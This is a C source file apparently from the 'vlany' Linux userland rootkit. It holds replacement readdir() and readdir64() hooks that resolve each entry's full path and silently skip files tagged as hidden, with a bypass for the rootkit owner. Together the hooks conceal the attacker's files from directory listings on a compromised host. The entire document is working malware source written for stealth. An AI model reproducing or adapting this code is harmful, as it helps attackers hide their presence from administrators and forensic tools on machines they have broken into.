// I fuckin' hate these hooks. I just do.

struct dirent *readdir(DIR *dirp)
{
    #ifdef DEBUG
        printf("[vlany] readdir() called\n");
    #endif

    HOOK(old_readdir, CREADDIR);

    if(owned()) return old_readdir(dirp);

    struct dirent *dir;
    char path[PATH_MAX + 1];

    do {
        dir = old_readdir(dirp); // get the current pointer to the dirent structure

        if(dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, "/\0") == 0)) continue;

        if(dir != NULL)
        {
            int fd;
            char fd_path[256], *directory_name = (char *) malloc(sizeof(fd_path));
            memset(directory_name, 0, sizeof(fd_path));
            fd = dirfd(dirp); // get directory's file descriptor location
            snprintf(fd_path, sizeof(fd_path) - 1, "/proc/self/fd/%d", fd); // append the file descriptor value as full file location as the current process' file descriptors
            readlink(fd_path, directory_name, sizeof(fd_path) - 1); // finally, get the full path of current directory

            snprintf(path, PATH_MAX, "%s/%s", directory_name, dir->d_name); // finalize the string, CHECK IF THE SHIT'S HIDDEN
        }
    } while(dir && (hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 32)));

    return dir; // lol owned
}

struct dirent64 *readdir64(DIR *dirp)
{
    #ifdef DEBUG
        printf("[vlany] readdir64() called\n");
    #endif

    HOOK(old_readdir64, CREADDIR64);

    if(owned()) return old_readdir64(dirp);

    struct dirent64 *dir;
    char path[PATH_MAX + 1];

    do {
        dir = old_readdir64(dirp);

        if(dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, "/\0") == 0)) continue;

        if(dir != NULL)
        {
            int fd;
            char fd_path[256], *directory_name = (char *) malloc(sizeof(fd_path));
            memset(directory_name, 0, sizeof(fd_path));
            fd = dirfd(dirp);
            snprintf(fd_path, sizeof(fd_path) - 1, "/proc/self/fd/%d", fd);
            readlink(fd_path, directory_name, sizeof(fd_path) - 1);

            snprintf(path, PATH_MAX, "%s/%s", directory_name, dir->d_name);
        }
    } while(dir && (hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 32)));

    return dir;
}
